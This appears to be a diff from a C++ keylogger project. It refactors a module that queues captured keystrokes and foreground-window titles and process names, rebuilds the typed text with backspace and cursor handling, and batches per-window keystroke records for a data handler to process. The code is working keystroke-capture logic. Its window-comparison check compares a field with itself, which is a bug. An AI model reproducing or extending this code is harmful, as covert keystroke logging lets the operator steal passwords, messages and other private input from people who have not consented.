@@ -1,13 +1,15 @@
 #pragma once
-#include "kbdworker.h"
-#include "lrcdatahandler.h"
+#include "kbdworker.hpp"
+#include "lrcdatahandler.hpp"
 #include "lrcdatawriter.hpp"
 #include "winfx.hpp"
-#include "settings.h"
+#include "tools.hpp"
+#include "settings.hpp"
 
 #include <mutex>
 #include <atomic>
 #include <chrono>
+
 #include <queue>
 #include <list>
 
@@ -16,16 +18,26 @@ using namespace LRCData;
 
 namespace
 {
+	struct KeyBundle
+	{
+		enum BundleType
+		{
+			VK_INFO,
+			WND_INFO
+		} type;
+		VKInfo vkInfo;
+		WNDInfo wndInfo;
+	};
+
 	std::atomic_bool isRunning;
 
-	const size_t maxRepeats = 5;
-	const size_t eventsToProcess = 20;
+	std::vector<Keyboard> kbdVector;
+	Keyboard pendingKeyboard;
 
-	std::queue<PartKeyboard> pkQueue;
-	std::list<PartKeyboard> pkList;
+	std::queue<KeyBundle> keyBundleQueue;
 
 	std::mutex stateMutex;
-	std::mutex pkQueueMutex;
+	std::mutex keyBundleQueueMutex;
 
 	std::thread queueWorkerThread;
 
@@ -35,7 +47,6 @@ namespace
 	size_t vkRepeats;
 
 	VKInfo lastVKInfo;
-	WNDInfo lastWNDInfo;
 
 	LRCDataWriter writer(Settings::sha256ID);
 
@@ -48,7 +59,7 @@ namespace
 	// Compares two WNDInfo structures
 	inline bool WNDInfoCmp(WNDInfo wnd1, WNDInfo wnd2)
 	{
-		return (wnd1.title == wnd2.title && wnd2.processName == wnd2.processName);
+		return (wnd1.title == wnd2.title && wnd2.process == wnd2.process);
 	}
 
 	// Is virtual key appends text into text fields
@@ -71,15 +82,14 @@ namespace
 		lastVKInfo.lang = 0;
 		lastVKInfo.flags = 0;
 
-		lastWNDInfo.title = L"";
-		lastWNDInfo.processName = L"";
+		pendingKeyboard.wndInfo = tools::GetWNDInfo(GetForegroundWindow());
 
-		pkList.clear();
+		kbdVector.clear();
 	}
 
 	void saveList()
 	{
-		ByteVector result = writer.GetBytes(pkList);
+		ByteVector result = writer.GetBytes(kbdVector);
 		LRCDataHandler::Process(result);
 
 		init();
@@ -87,36 +97,43 @@ namespace
 
 	void resetCursor()
 	{
-		pkListCursor = pkListCursorBegin = pkList.size();
+		pkListCursor = pkListCursorBegin = pendingKeyboard.keys.size();
 	}
 
 	void eraseLeft()
 	{
 		if (pkListCursor > pkListCursorBegin)
 		{
-			std::list<PartKeyboard>::iterator it = pkList.begin();
+			std::list<VKInfo>::iterator it = pendingKeyboard.keys.begin();
 			std::advance(it, pkListCursor - 1);
-			pkList.erase(it);
+			pendingKeyboard.keys.erase(it);
 			pkListCursor--;
 		}
 	}
 
 	void eraseRigth()
 	{
-		if (pkListCursor < pkList.size())
+		if (pkListCursor < pendingKeyboard.keys.size())
 		{
-			std::list<PartKeyboard>::iterator it = pkList.begin();
+			std::list<VKInfo>::iterator it = pendingKeyboard.keys.begin();
 			std::advance(it, pkListCursor);
-			pkList.erase(it);
+			pendingKeyboard.keys.erase(it);
 		}
 	}
 
-	void processVKInfo(PartKeyboard pk)
+	void processVKInfo(VKInfo vkInfo)
 	{
-		// Filter virtual-key repeats
-		if (VKInfoCmp(pk.vkInfo, lastVKInfo))
+		if (kbdVector.size() == 0)
 		{
-			if (vkRepeats != maxRepeats)
+			Keyboard kbd;
+			kbd.wndInfo = tools::GetWNDInfo(GetForegroundWindow());
+			kbdVector.push_back(kbd);
+		}
+
+		// Filter virtual-key repeats
+		if (VKInfoCmp(vkInfo, lastVKInfo))
+		{
+			if (vkRepeats != Settings::KeyboardSvc::maxRepeats)
 			{
 				vkRepeats++;
 			}
@@ -128,40 +145,44 @@ namespace
 		else
 		{
 			vkRepeats = 0;
-			lastVKInfo = pk.vkInfo;
+			lastVKInfo = vkInfo;
 		}
 
-		if (isprintable(pk.vkInfo.keyCode))
+		if (isprintable(vkInfo.keyCode))
 		{
 			// Insert 'pk' into 'pkList'
-			std::list<PartKeyboard>::iterator it = pkList.begin();
+			std::list<VKInfo>::iterator it = pendingKeyboard.keys.begin();
 			std::advance(it, pkListCursor);
-			pkList.insert(it, pk);
+			pendingKeyboard.keys.insert(it, vkInfo);
 
 			// Increment cursor counters
 			pkListCursor++;
 		}
 	}
 
-	void processWNDInfo(PartKeyboard pk)
+	void processWNDInfo(WNDInfo wndInfo)
 	{
-		resetCursor();
-
-		if (!WNDInfoCmp(lastWNDInfo, pk.wndInfo))
+		if (!WNDInfoCmp(wndInfo, pendingKeyboard.wndInfo))
 		{
-			pkList.push_back(pk);
+			kbdVector.push_back(pendingKeyboard);
+
+			if (kbdVector.size() >= Settings::KeyboardSvc::eventsToProcess)
+			{
+				saveList();
+			}
+
+			pendingKeyboard.wndInfo = wndInfo;
+			pendingKeyboard.keys.clear();
+			resetCursor();
 		}
-
-		lastWNDInfo = pk.wndInfo;
-
 	}
 
-	void processPartKeyboard(PartKeyboard pk)
+	void processKeyBundle(KeyBundle keyBundle)
 	{
-		switch (pk.subtype)
+		switch (keyBundle.type)
 		{
-		case LRCDATA_KEYBOARD_SUBTYPE_VKINFO:
-			switch (pk.vkInfo.keyCode)
+		case KeyBundle::VK_INFO:
+			switch (keyBundle.vkInfo.keyCode)
 			{
 			case VK_BACK:
 				eraseLeft();
@@ -175,7 +196,7 @@ namespace
 				break;
 			case VK_DOWN:
 				// Point cursor to the end
-				pkListCursor = pkList.size();
+				pkListCursor = pendingKeyboard.keys.size();
 				break;
 			case VK_LEFT:
 				// Shift virtual-key cursor to left if cursor isn't at begining
@@ -186,18 +207,18 @@ namespace
 				break;
 			case VK_RIGHT:
 				// Shift virtual-key cursor to right if cursor isn't at end
-				if (pkListCursor < pkList.size())
+				if (pkListCursor < pendingKeyboard.keys.size())
 				{
 					pkListCursor++;
 				}
 				break;
 			default:
-				processVKInfo(pk);
+				processVKInfo(keyBundle.vkInfo);
 				break;
 			}
 			break;
-		case LRCDATA_KEYBOARD_SUBTYPE_WNDINFO:
-			processWNDInfo(pk);
+		case KeyBundle::WND_INFO:
+			processWNDInfo(keyBundle.wndInfo);
 			break;
 		}
 	}
@@ -206,23 +227,18 @@ namespace
 	{
 		while (isRunning.load())
 		{
-			pkQueueMutex.lock();
-			bool pkQueueEmpty = pkQueue.empty();
-			pkQueueMutex.unlock();
+			keyBundleQueueMutex.lock();
+			bool pkQueueEmpty = keyBundleQueue.empty();
+			keyBundleQueueMutex.unlock();
 
 			if (!pkQueueEmpty)
 			{
-				pkQueueMutex.lock();
-				PartKeyboard pk = pkQueue.front();
-				pkQueue.pop();
-				pkQueueMutex.unlock();
+				keyBundleQueueMutex.lock();
+				KeyBundle keyBundle = keyBundleQueue.front();
+				keyBundleQueue.pop();
+				keyBundleQueueMutex.unlock();
 
-				processPartKeyboard(pk);
-
-				if (pkList.size() >= eventsToProcess)
-				{
-					saveList();
-				}
+				processKeyBundle(keyBundle);
 
 				std::this_thread::sleep_for(std::chrono::milliseconds(5));
 			}
@@ -274,23 +290,23 @@ bool KeyboardWorker::IsRunning()
 
 void KeyboardWorker::Add(VKInfo vkInfo)
 {
-	PartKeyboard pk;
-	pk.subtype = LRCDATA_KEYBOARD_SUBTYPE_VKINFO;
-	pk.vkInfo = vkInfo;
+	KeyBundle keyBundle;
+	keyBundle.type = KeyBundle::VK_INFO;
+	keyBundle.vkInfo = vkInfo;
 
-	pkQueueMutex.lock();
-	pkQueue.push(pk);
-	pkQueueMutex.unlock();
+	keyBundleQueueMutex.lock();
+	keyBundleQueue.push(keyBundle);
+	keyBundleQueueMutex.unlock();
 }
 
 
 void KeyboardWorker::Add(LRCData::WNDInfo wndInfo)
 {
-	PartKeyboard pk;
-	pk.subtype = LRCDATA_KEYBOARD_SUBTYPE_WNDINFO;
-	pk.wndInfo = wndInfo;
+	KeyBundle keyBundle;
+	keyBundle.type = KeyBundle::WND_INFO;
+	keyBundle.wndInfo = wndInfo;
 
-	pkQueueMutex.lock();
-	pkQueue.push(pk);
-	pkQueueMutex.unlock();
+	keyBundleQueueMutex.lock();
+	keyBundleQueue.push(keyBundle);
+	keyBundleQueueMutex.unlock();
 }
